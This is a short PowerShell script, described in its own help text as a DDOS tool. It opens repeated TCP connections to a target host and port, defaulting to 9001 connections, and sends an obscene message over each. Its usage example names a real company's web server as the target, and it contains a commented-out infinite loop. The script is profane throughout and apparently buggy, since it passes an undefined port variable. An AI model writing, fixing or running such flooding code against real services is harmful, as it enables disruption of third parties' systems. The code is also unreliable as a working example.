<#
.Synopsis
   Tells a service to get fucked, spams socket with dicks. 
.DESCRIPTION
   DDOS
.EXAMPLE
   Invoke-Dickbomb -target www.cisco.com -port 80
.EXAMPLE
   Another example of how to use this cmdlet
#>
    [CmdletBinding()]
    [Alias()]
    [OutputType([int])]
Param
(
    [Parameter(Mandatory=$true,
                ValueFromPipelineByPropertyName=$true,
                Position=0)]
    $target,
    $port,
    $count = 9001
)
$DebugPreference = "Continue"

function spam-port ($target, $dport){
    try{
        $dick = "GET FUCKED!!!"
        $dick += "8==========================================================================D"
        $dickbytes = [System.Text.Encoding]::ASCII.GetBytes($dick)
        $sock = New-Object Net.Sockets.TcpClient
        $sock.Connect("$target","$dport")
        if ($sock.connected -eq "True") {
            Write-Debug "socket found, attempting to dickspam"
            $stream = $sock.GetStream()
            if ($stream.CanWrite -eq $True){
                $stream.Write($dickbytes, 0, ($dickbytes.Count))
                Write-Debug "dicks sent to $target : $port"
            }
    }
}
    catch {Write-Debug "unable to dickspam"}
}

# Send over 9001 dicks
1..$count | %{
    spam-port -target $target -dport $dport
}
#while ($true) {spam-port -target $target -dport $dport}
